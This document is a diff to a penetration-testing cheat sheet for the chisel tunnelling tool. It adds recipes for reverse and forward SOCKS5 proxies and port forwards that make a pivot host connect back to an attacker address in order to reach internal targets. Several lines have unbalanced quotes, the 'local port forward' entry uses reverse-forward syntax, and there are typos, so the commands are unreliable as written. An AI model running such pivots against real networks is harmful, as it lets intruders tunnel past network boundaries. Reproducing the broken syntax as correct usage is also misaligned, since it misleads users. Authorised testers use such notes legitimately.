@@ -1,7 +1,17 @@
-% tunnel
+% tunnel, forward, poxy, socks
 
-# server
-chisel server -p <port> --reverse
+# Reverse SOCKS5 proxy
+chisel server -p <attackport> --reverse
+echo "chisel client <attackip>:<attackport> R:socks"
 
-# client
-chisel client <serverip>:<serverport> R:<port>:127.0.0.1:<port>
+# Forward SOCKS5 proxy
+echo "chisel server -p <pivotport> --reverse
+chisel client <pivotip>:<pivotport> <atttackport>:socks
+
+# Reverse port forward
+chisel server -p <attackport> --reverse
+echo "chisel client <attackip>:<attackport> R:<pivotport>:<targetip>:<targetport>"
+
+# Local port forward
+echo "chisel server -p <pivotport>"
+chisel client <pivotip>:<pivotport> R:<attackport>:<targetip>:<targetport>"
